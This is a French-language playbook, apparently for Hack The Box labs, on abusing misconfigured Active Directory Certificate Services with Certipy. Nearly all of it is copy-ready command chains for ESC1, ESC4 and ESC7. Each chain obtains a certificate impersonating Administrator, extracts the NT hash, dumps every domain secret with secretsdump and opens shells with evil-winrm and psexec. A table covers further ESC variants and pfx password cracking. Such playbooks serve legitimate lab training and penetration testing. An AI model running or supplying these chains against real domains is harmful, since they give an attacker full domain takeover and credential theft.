# ADCS — Playbook complet pour HTB

> ADCS = Active Directory Certificate Services. C'est le rôle Windows qui gère les certificats dans un domaine. Quand il est mal configuré, il ouvre des chemins directs vers DA. Certipy est l'outil principal pour l'énumérer et l'exploiter.

---

## 1. C'est quoi ADCS en 3 lignes

Un DC peut jouer le rôle de **CA (Certificate Authority)** — il délivre des certificats à des utilisateurs ou machines. Ces certificats servent à s'authentifier sur le domaine (PKINIT = auth Kerberos par certificat). Si un utilisateur peut obtenir un certificat **au nom d'un autre** (ex: Administrator), il peut s'authentifier en tant que cet utilisateur et récupérer son hash NT.

---

## 2. Workflow Certipy — toujours dans cet ordre

### Étape 1 — Énumération (dès que tu as des creds valides)

```bash
certipy-ad find \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -dc-ip IP_DC \
  -vulnerable \
  -stdout
```

**Avec un hash NT :**
```bash
certipy-ad find \
  -u 'USER@domaine.htb' \
  -hashes 'HASH_NT' \
  -dc-ip IP_DC \
  -vulnerable \
  -stdout
```

**Ce que tu cherches dans la sortie :**
- `[!] Vulnerabilities` → liste les ESC trouvées
- `Enrollment Rights` → qui peut demander ce template
- `msPKI-Certificate-Name-Flag` → contient `ENROLLEE_SUPPLIES_SUBJECT` = ESC1
- `Enabled` → `True` (template actif)
- `Client Authentication` → `True` (le certificat sert à s'authentifier)

---

### Étape 2 — Exploitation selon l'ESC trouvée

#### ESC1 — Template qui permet de choisir le SAN (le plus courant)

**Condition :** `ENROLLEE_SUPPLIES_SUBJECT` activé + `Client Authentication` + tu peux enrôler

```bash
# Demander un certificat en se faisant passer pour Administrator
certipy-ad req \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -ca 'NOM_DE_LA_CA' \
  -template 'NOM_DU_TEMPLATE' \
  -upn 'administrator@domaine.htb' \
  -dc-ip IP_DC
# → génère administrator.pfx
```

---

#### ESC4 — GenericWrite sur un template (modifier le template pour le rendre ESC1)

**Condition :** tu as GenericWrite sur un template de certificat

```bash
# Étape 1 : modifier le template pour activer ENROLLEE_SUPPLIES_SUBJECT
certipy-ad template \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -template 'NOM_DU_TEMPLATE' \
  -save-old \
  -dc-ip IP_DC

# Étape 2 : exploiter comme ESC1
certipy-ad req \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -ca 'NOM_DE_LA_CA' \
  -template 'NOM_DU_TEMPLATE' \
  -upn 'administrator@domaine.htb' \
  -dc-ip IP_DC

# Étape 3 : restaurer le template original (cleanup)
certipy-ad template \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -template 'NOM_DU_TEMPLATE' \
  -configuration ancien_template.json \
  -dc-ip IP_DC
```

---

#### ESC7 — ManageCertificates sur la CA (approbation manuelle de requêtes)

**Condition :** tu as le droit `ManageCertificates` sur la CA elle-même (pas un template)

```bash
# Étape 1 : s'ajouter le droit Officer (ManageCertificates) si tu as ManageCA
certipy-ad ca \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -ca 'NOM_DE_LA_CA' \
  -add-officer USER \
  -dc-ip IP_DC

# Étape 2 : activer le template SubCA (toujours disponible)
certipy-ad ca \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -ca 'NOM_DE_LA_CA' \
  -enable-template SubCA \
  -dc-ip IP_DC

# Étape 3 : demander un certificat (sera refusé mais on récupère l'ID)
certipy-ad req \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -ca 'NOM_DE_LA_CA' \
  -template SubCA \
  -upn 'administrator@domaine.htb' \
  -dc-ip IP_DC
# → Failed (pending) mais note le Request ID retourné

# Étape 4 : approuver la requête avec les droits Officer
certipy-ad ca \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -ca 'NOM_DE_LA_CA' \
  -issue-request ID_DE_LA_REQUETE \
  -dc-ip IP_DC

# Étape 5 : récupérer le certificat approuvé
certipy-ad req \
  -u 'USER@domaine.htb' \
  -p 'PASSWORD' \
  -ca 'NOM_DE_LA_CA' \
  -retrieve ID_DE_LA_REQUETE \
  -dc-ip IP_DC
# → génère administrator.pfx
```

---

### Étape 3 — Authentification avec le certificat (commun à tous les ESC)

```bash
certipy-ad auth \
  -pfx 'administrator.pfx' \
  -dc-ip IP_DC
# → retourne le hash NT de Administrator
```

**Si le pfx est protégé par un mot de passe :**
```bash
certipy-ad auth \
  -pfx 'administrator.pfx' \
  -password 'MOT_DE_PASSE' \
  -dc-ip IP_DC
```

---

### Étape 4 — Utiliser le hash NT pour se connecter

```bash
# Dump complet du domaine
impacket-secretsdump -hashes ':HASH_NT' 'domaine.htb/administrator@IP_DC'

# Shell via WinRM
evil-winrm -i IP_DC -u administrator -H 'HASH_NT'

# Shell via psexec
impacket-psexec -hashes ':HASH_NT' 'domaine.htb/administrator@IP_DC'
```

---

## 3. Tableau récapitulatif des ESC

| ESC | Condition | Outil | Commande clé |
|-----|-----------|-------|--------------|
| **ESC1** | Template avec `ENROLLEE_SUPPLIES_SUBJECT` + enroll possible | certipy req | `-upn administrator@domaine.htb` |
| **ESC2** | Template `Any Purpose` ou sans EKU + enroll possible | certipy req | Même que ESC1 |
| **ESC3** | Template `Certificate Request Agent` + second template | certipy req | Deux étapes : agent cert puis on-behalf-of |
| **ESC4** | GenericWrite sur un template | certipy template | Modifier le template → ESC1 |
| **ESC7** | ManageCertificates sur la CA | certipy ca | Approuver sa propre requête |
| **ESC8** | Web Enrollment activé + NTLM relay possible | ntlmrelayx | Relay vers http://CA/certsrv |
| **ESC9** | `CT_FLAG_NO_SECURITY_EXTENSION` + GenericWrite sur compte | certipy account + req | Modifier UPN du compte avant de demander le cert |
| **ESC10** | Faible vérification du mapping cert→compte | certipy account + req | Similaire ESC9 |

---

## 4. Ce que certipy affiche et comment le lire

```
Certificate Templates
  0
    Template Name          : NomDuTemplate       ← nom à utiliser dans -template
    Enabled                : True                ← doit être True
    Client Authentication  : True                ← doit être True pour s'authentifier
    Enrollee Supplies SAN  : True                ← = ESC1 si True
    Enrollment Rights      :
      CERTIFIED.HTB\Domain Users  ← si tu es Domain User, tu peux enrôler
    [!] Vulnerabilities
      ESC1 : ...            ← certipy te dit directement l'ESC
```

---

## 5. Erreurs fréquentes et fix

| Erreur | Cause | Fix |
|--------|-------|-----|
| `KDC_ERR_CLIENT_NOT_TRUSTED` | Le DC ne fait pas confiance au certificat | Vérifier que la CA est bien celle du domaine |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | PKINIT non supporté ou DC ne supporte pas l'auth par cert | Essayer un autre DC ou vérifier les ports 88/636 |
| `Invalid password or PKCS12 data` | Le .pfx est protégé par un mot de passe | `pfx2john cert.pfx \| john` |
| `Failed to get TGT` | Problème de synchro horaire | `sudo ntpdate IP_DC` puis relancer |
| `Could not find any certificate templates` | Le compte n'a pas les droits d'énumération suffisants | Changer de compte ou vérifier les droits sur les templates |

---

## 6. Réflexes ADCS à avoir sur chaque machine

- ☐ Dès que tu vois le port **80/443 avec `/certsrv`** → ADCS présent → lancer certipy find
- ☐ Dès que tu as **ManageCA ou ManageCertificates** → penser ESC7
- ☐ Dès que tu as **GenericWrite sur un template** → penser ESC4
- ☐ Dès que certipy find ne trouve rien avec un compte → essayer avec un **compte plus privilégié**
- ☐ Toujours `ntpdate` avant tout move Kerberos/certipy
- ☐ Toujours vérifier le FQDN dans `/etc/hosts` (DC01.domaine.htb, pas juste domaine.htb)
